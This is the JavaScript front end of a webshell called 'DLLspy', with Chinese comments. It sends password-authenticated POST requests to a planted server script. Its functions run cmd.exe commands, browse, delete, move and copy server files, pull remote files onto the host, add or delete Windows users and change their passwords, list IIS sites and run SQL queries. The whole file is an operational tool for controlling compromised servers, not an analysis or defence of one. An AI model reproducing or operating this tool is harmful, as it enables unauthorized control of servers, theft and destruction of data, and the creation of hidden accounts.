
var shellurl;
var shellpass;
var actionTimeOut=10000;


//超时检查
function TimeOutCheck(actionControls) { 
  
	//alert($("#"+actionControls).val());
}

//截取回显信息
function  SubBackShow(BackStr)
{
	var bkstr="";
	if(BackStr.indexOf("We_are_the_world_I_miss_you")>0)
	{
		bkstr=BackStr.substring(BackStr.indexOf("We_are_the_world_I_miss_you")+27);
	}
//	bkstr=bkstr.replace(/</g,"&lt;");
//	bkstr=bkstr.replace(/>/g,"&gt;");
//	alert(bkstr);
	return bkstr;
	}

//登陆事件
function LoginAction()
{
	$("#ShellLogin").attr("disabled",true);
	shellurl=$("#LoginUrl").val();
	shellpass=$("#ShellPassWord").val();
	
	//sleep("ShellLogin");
	jQuery.post(shellurl,{"DLLspy_action":"login","random":Math.random(),"DLLspy_pass":shellpass},function(data){
					
					data=SubBackShow(data);	
					//alert(data);
					if(data.length>0){
					$("#ServerIp").html("<font color='red'>Server Host:</font>"+data.split('|')[2]+"<font color='red' style='margin-left:40px;'>Server  OS:</font>"+data.split('|')[1]);
					$("#ServerFrameWork").html("<font color='red'>Framework Ver : </font>"+data.split('|')[0]);
					$("#DLLBanner").html(data.split('|')[3]);
					$("#DirPath").val(data.split('|')[4]);
					$("#WebRootDir").val(data.split('|')[4]);
					$("#SourcePath").val(data.split('|')[4]);
					$("#GzipPath").val(data.split('|')[4]);
					$("#SearchPath").val(data.split('|')[4]);
					$("#LocalPath").val(data.split('|')[4]+"\\cmd.exe");
					alert('Login OK!');
					$("#adminurl").val(shellurl);
					$("#adminpass").val(shellpass);
					$("#showme").fadeOut("slow");
					$("#MenuPanal").fadeIn("slow");
					$("#systeminfo").fadeIn("slow");	
					
					}else{alert('Login Fail!.'+data);}
					$("#ShellLogin").attr("disabled",false);
					;});
	GetDiv('aboutMe');
	//setTimeout(TimeOutCheck("ShellLogin"),50000);
}

//执行CMD
function ExecQuery()
{
	$("#exec").attr("disabled",true);
	var cmdpath=$("#DLLspy_cmd").val();
	var cmdquery=$("#DLLspy_q").val();
	var DLLspy_cmdclose=$("#DLLspy_cmdclose").val();
	var win_adminuser=$("#win_adminuser").val();
	var win_adminpass=$("#win_adminpass").val();
	var backinfo="";
	//alert(shellurl);alert(shellpass);alert(cmdpath);alert(cmdquery);
	$.post(shellurl,{"DLLspy_action":"cmd","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_cmd":cmdpath,"DLLspy_q":cmdquery,"DLLspy_adminuser":win_adminuser,"DLLspy_adminpass":win_adminpass},function(data){																																  					//alert(data);
						//alert(win_adminpass);
						//alert(win_adminuser);
					backinfo="DateLength:"+data.length+"<br>"+SubBackShow(data);
					$("#BackShow").html(backinfo);
					$("#exec").attr("disabled",false);
					;});
}

//执行文件打包&&解压
function packAction()
{
	var SourcePath=$("#SourcePath").val();
	var GzipPath=$("#GzipPath").val();
	var GzipFileName=$("#GzipFileName").val();
	var packAction=$("#packAction").val();
	var backinfo="";
	$("#packstate").html("");
	$("#packSubmit").attr("disabled",true);
	$("#packstate").html("wait~~~~-_-||");
	//alert(shellurl);alert(shellpass);alert(cmdpath);alert(cmdquery);
	$.post(shellurl,{"DLLspy_action":"compress","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_FuncType":packAction,"DLLspy_sourPath":SourcePath,"DLLspy_GzipFolder":GzipPath,"DLLspy_GzipName":GzipFileName},function(data){																																  					//alert(data);
					backinfo=SubBackShow(data);
					$("#packstate").html(backinfo);
					$("#packSubmit").attr("disabled",false);
					;});
}

//文件搜索
function SearchFile()
{
	var SearchPath=$("#SearchPath").val();
	var SearchKey=$("#SearchKey").val();
	var SearchModel=$("#SearchModel").val();
	var backinfo="";
	$.post(shellurl,{"DLLspy_action":"SearchFile","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_path":SearchPath,"DLLspy_str":SearchKey,"DLLspy_type":SearchModel},function(data){																																  					//alert(data);
					backinfo=SubBackShow(data);
					//SubSystemInfo(backinfo);
					$("#SearchDate").html(backinfo);
					;});
	}

///获取搜索结果
function GetSearchInfo()
{
	var backinfo="";
	$.post(shellurl,{"DLLspy_action":"GetSearchData","random":Math.random(),"DLLspy_pass":shellpass},function(data){																																  					//alert(data);
					backinfo=SubBackShow(data);
					//SubSystemInfo(backinfo);
					$("#SearchDate").html(backinfo);
					;});
	}
	
//终止文件搜索线程
function EndSearch()
{
	var backinfo="";
	$.post(shellurl,{"DLLspy_action":"EndSearchProcess","random":Math.random(),"DLLspy_pass":shellpass},function(data){																																  					//alert(data);
					backinfo=SubBackShow(data);
					//SubSystemInfo(backinfo);
					$("#SearchDate").html(backinfo);
					;});
	}
	

//远程下载文件
function URLDownLoad()
{
	$("#downloadmsg").html('DownLoading');
	var RemoteURL=$("#RemoteURL").val();
	var LocalPath=$("#LocalPath").val();
	var backinfo="";
	$.post(shellurl,{"DLLspy_action":"RemoteDownLoad","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_RemoteURL":RemoteURL,"DLLspy_LocalPath":LocalPath},function(data){
					backinfo=SubBackShow(data);
					$("#downloadmsg").html(backinfo);
					;});
	}


//获取所有用户
function WinAPIGetAllUsers()
{
	var backinfo="";
	var actionapi="AllUsers";
	var DLLspy_username="123";
	$.post(shellurl,{"DLLspy_action":"winUserAPI","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_actionAPI":"AllUsers","DLLspy_username":DLLspy_username},function(data){
					backinfo=SubBackShow(data);
					$("#winUserinfo").html(backinfo);
					;});
	}
	
//添加用户
function WinAPIAddUsers()
{
	var backinfo="";
	var actionapi="AddUser";
	var DLLspy_username=$("#APIUserName").val();
	var DLLspy_password=$("#APIPassWord").val();
	var DLLspy_UserGroup=$("#APIUserGroup").val();
	$.post(shellurl,{"DLLspy_action":"winUserAPI","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_actionAPI":"AddUser","DLLspy_username":DLLspy_username,"DLLspy_password":DLLspy_password,"DLLspy_UserGroup":DLLspy_UserGroup},function(data){
					backinfo=SubBackShow(data);
					$("#winUserinfo").html(backinfo);
					;});
	}

//修改密码
function WinAPIChangePassword()
{
	var backinfo="";
	var actionapi="ChangePassword";
	var DLLspy_username=$("#APIUpdateUserName").val();
	var DLLspy_password=$("#APINewPassWord").val();
	var DLLspy_oldpassword=$("#APIOldPassWord").val();
	$.post(shellurl,{"DLLspy_action":"winUserAPI","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_actionAPI":"ChangePassword","DLLspy_username":DLLspy_username,"DLLspy_password":DLLspy_password,"DLLspy_oldpass":DLLspy_oldpassword},function(data){
					backinfo=SubBackShow(data);
					$("#winUserinfo").html(backinfo);
					;});
	}

//获取用户信息
function WinAPIGetUserInfo()
{
	var backinfo="";
	var actionapi="GetUserInfo";
	var DLLspy_username=$("#APIInfoUserName").val();
	$.post(shellurl,{"DLLspy_action":"winUserAPI","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_actionAPI":"GetUserInfo","DLLspy_username":DLLspy_username},function(data){
					backinfo=SubBackShow(data);
					$("#winUserinfo").html(backinfo);
					;});
	}

//删除用户
function WinAPIDelUser()
{
	var backinfo="";
	var actionapi="DelUser";
	var DLLspy_username=$("#APIDelUserName").val();
	$.post(shellurl,{"DLLspy_action":"winUserAPI","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_actionAPI":"DelUser","DLLspy_username":DLLspy_username},function(data){
					backinfo=SubBackShow(data);
					$("#winUserinfo").html(backinfo);
					;});
	}



///上级目录
function GoParentDir()
{
	var IndexDir=$("#DirPath").val();
	ListDir(IndexDir,2);
}
//返回根目录
function GoWebRootDir()
{
	var rootpath=$("#WebRootDir").val();
	ListDir(rootpath,4);
}

//直接转到目录
function DirDirectory()
{
	var GoPath=$("#DirPath").val();
	ListDir(GoPath,1);
}
//点击目录
function ClickDir(t)
{
	var $t=$(t);
	var fullpath=null;
	fullpath=$t.attr("title");
	var pathstr=URLDecode(fullpath);
	ListDir(pathstr,1);
	}
	
//列目录
function ListDir(fullpath,RquqestType)
{
	 
	$("#IndexDir").val(fullpath);
	$("#DirPath").val(fullpath);
	//alert(fullpath);
	var backinfo="";
	$.post(shellurl,{"DLLspy_action":"files","DLLspy_RquestType":RquqestType,"random":Math.random(),DLLspy_pass:shellpass,"DLLspy_path":fullpath},function(data){					
						backinfo=SubBackShow(data);
						$("#FileExplore").html(backinfo);
						if(RquqestType==2)
						{
							$("#DirPath").val($("#cp").html());
							}
					;});
	}

//删除目录或文件
function DelFile(fullpath)
{
	if(confirm("Do you want to del the file/directory ?")) 
　　{
		$.post(shellurl,{"DLLspy_action":"files","DLLspy_RquestType":3,"random":Math.random(),DLLspy_pass:shellpass,"DLLspy_path":fullpath},function(data){					
						backinfo=SubBackShow(data);
						ListDir($("#DirPath").val(),1);
						alert(backinfo);
					;});
　　} 
　　else 
　　{
　　} 
	}
	

//移动目录
function MoveFile(enfullpath)
{
	var fullpath=URLDecode(enfullpath);
	var newpath=prompt("Type LocalPath:",""); 
	if(newpath)
　　{ 
　　		fullpath =PostdataEnCode(fullpath)+"$"+ PostdataEnCode(newpath);
　　}
	else
	{
		return;
		}
	$.post(shellurl,{"DLLspy_action":"files","DLLspy_RquestType":5,"random":Math.random(),DLLspy_pass:shellpass,"DLLspy_path":fullpath},function(data){					
						backinfo=SubBackShow(data);
						ListDir($("#DirPath").val(),1);
						alert(backinfo);
					;});
	}

//复制文件
function CopyFile(enfullpath)
{
	var fullpath=URLDecode(enfullpath);
	var newpath=prompt("Type LocalPath:",""); 
	if(newpath)
　　{ 
　　		fullpath =PostdataEnCode(fullpath)+"$"+ PostdataEnCode(newpath);
　　}
	else
	{
		return;
		}
	$.post(shellurl,{"DLLspy_action":"files","DLLspy_RquestType":6,"random":Math.random(),DLLspy_pass:shellpass,"DLLspy_path":fullpath},function(data){					
						backinfo=SubBackShow(data);
						ListDir($("#DirPath").val(),1);
						alert(backinfo);
					;});
	}



//获取IIS所有站点
function GetSearchDate()
{
	var backinfo="";
	$.post(shellurl,{"DLLspy_action":"IISspy","random":Math.random(),"DLLspy_pass":shellpass},function(data){																																  					//alert(data);
					backinfo=SubBackShow(data);
					//SubSystemInfo(backinfo);
					$("#IISsite").html(backinfo);
					;});
	}
	

//IISspy的点击事件
function IISspyClick(WebSitePath)
{
	GetDiv('FileExplore');
	ListDir(WebSitePath);
	}


//连接数据库
function ConnSQL()
{
	var backinfo="";
	var DLLspy_SqlType=$("#SqlType").val();
	var DLLspy_ConnStr=$("#ConnStr").val();
	var DLLspy_SqlText=$("#SqlText").val();
	$.post(shellurl,{"DLLspy_action":"SQL","random":Math.random(),"DLLspy_pass":shellpass,"DLLspy_SqlType":"sqlserver","DLLspy_SqlType":DLLspy_SqlType,"DLLspy_ConnStr":DLLspy_ConnStr,"DLLspy_SqlText":DLLspy_SqlText},function(data){
					backinfo=SubBackShow(data);
					$("#SQLDataTable").html(backinfo);
					;});
	}


//获取系统信息
function systeminfo()
{
	var backinfo="";
	$.post(shellurl,{"DLLspy_action":"systeminfo","random":Math.random(),DLLspy_pass:shellpass},function(data){																																  					//alert(data);
					backinfo="DateLength:"+data.length+"<br>"+SubBackShow(data);
					//SubSystemInfo(backinfo);
					$("#systeminfo").html(backinfo);
					;});
	}
	
//截取系统回显信息
function SubSystemInfo(SysStr)
{
	var Sysipdress=SysStr.substring(BackStr.indexOf("IPAdress")+8);
	Sysipdress=Sysipdress.substring(0,BackStr.indexOf("<br>"));
	alert(Sysipdress);
	}

//对URL进行解密
function URLDecode(fullpath)
{
	var charlist= fullpath.split("|");
	var pathstr="";
	for(var i=0;i<charlist.length;i++)
	{
		pathstr += String.fromCharCode(charlist[i]);
		}
	return pathstr
	}
	
//字符串转ASCII码
function PostdataEnCode(poststr)
{
	var postdata="";
	postdata=poststr;
	var encodestr="";
	for(i=0;i<postdata.length;i++)
	{
		encodestr += postdata.charCodeAt(i);
		if(i!=postdata.length-1)
		{
			encodestr += "|";
		}
	}
	return encodestr;
	}